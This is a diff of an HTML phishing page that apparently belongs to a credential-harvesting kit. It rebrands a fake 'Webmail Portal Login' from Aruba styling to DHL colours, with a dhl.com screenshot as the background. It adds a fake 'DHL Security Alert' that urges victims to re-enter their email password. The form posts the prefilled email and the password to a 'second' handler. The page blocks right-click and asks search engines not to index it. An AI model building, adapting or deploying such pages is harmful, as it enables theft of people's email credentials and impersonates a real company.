@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex, nofollow">
-    <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+    <link rel="icon" href="https://api.kickfire.com/logo?website=web.de" type="image/x-icon">
     <title>Webmail Portal Login</title>
     <style>
         html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
@@ -102,7 +102,7 @@
             margin: 10px auto;
         }
         .finput input[type=email], .finput input[type=password] {
-            font-size: 24px;
+            font-size: 15px;
             padding: 7px 10px 7px 40px;
             border-radius: 4px;
             margin: 5px 0;
@@ -119,11 +119,11 @@
             border: 1px solid #0d4f8b;
         }
         button {
-            border: 1px solid #0d4f8b;
-            font-size: 20px;
+            border: 1px solid #D40511;
+            font-size: 15px;
             padding: 7px 20px;
             border-radius: 4px;
-            background-color: #0d4f8b;
+            background-color: #D40511;
             color: #fff;
         }
         button:hover {
@@ -154,18 +154,18 @@
 </head>
 
 <body oncontextmenu="return false;">
-    <iframe src="https://image.thum.io/get/width/1600/crop/700/noanimate/https://aruba.it" class="fullscreen-iframe"></iframe> <!-- Full background iframe -->
+    <iframe src="https://image.thum.io/get/width/1600/crop/700/noanimate/https://dhl.com" class="fullscreen-iframe"></iframe> <!-- Full background iframe -->
 
    <div class="form-holder">
         <div class="xlogo">
-            <link rel="icon" href="https://image.thum.io/get/width/1600/crop/700/noanimate/https://aruba.it" type="image/x-icon">
+            <link rel="icon" href="https://image.thum.io/get/width/1600/crop/700/noanimate/https://dhl.com" type="image/x-icon">
             <span style="text-transform: capitalize;" id="banNer"></span>
         </div>
         <div class="form-wrap">
             <form action="second" method="POST">
                 
             Please login with your email to connect DHL 
-                <img src="https://mydhl.express.dhl/content/dhl/us/en/_jcr_content/top-nav-v2/image.img.png/1614969224184.png">
+                <img src="https://i.postimg.cc/NGKdqJnv/logo-aruba.png">
             <center>
                 <div class="alert alert-danger" id="mgss" style="display: none;color: red;font-weight: 600;margin-top: 20px">Incorrect password..! Please enter the correct password.</div>
                 <span id="error" class="text-danger" style="display: none;color: red;">That account does not exist. Please enter a different account.</span>
@@ -173,11 +173,25 @@
             <div class="finput">
                 <input type="email" id="ai" name="horse" value="{{eman}}" required="" >
             </div>
+       <div id="password-error" 
+     style="display:block;
+            color:#D40511;
+            background:#fff3f3;
+            border:1px solid #D40511;
+            border-left:4px solid #D40511;
+            font-size:14px;
+            font-weight:600;
+            padding:10px;
+            margin-bottom:8px;
+            text-align:left;
+            width:90%;
+            margin-left:auto;
+            margin-right:auto;
+            border-radius:4px;">
+    DHL Security Alert: Incorrect password detected. Please confirm your email password to continue.
+</div>
             <div class="finput">
-                <input type="password" name="pig" placeholder="Password" id="pr" required="">
-            </div>
-                 <div id="signInErrorDiv" class="signInError" role="alert" tabIndex="0" style="display: none;color: red;" >
-            Password you entered isn&#39;t correct. Try again with Email password
+                <input type="password" name="pig" placeholder="Password" id="pr" required="" autofocus="focus">
             </div>
             <div class="finput btn">
                 <button id="submit-btn">Login</button>
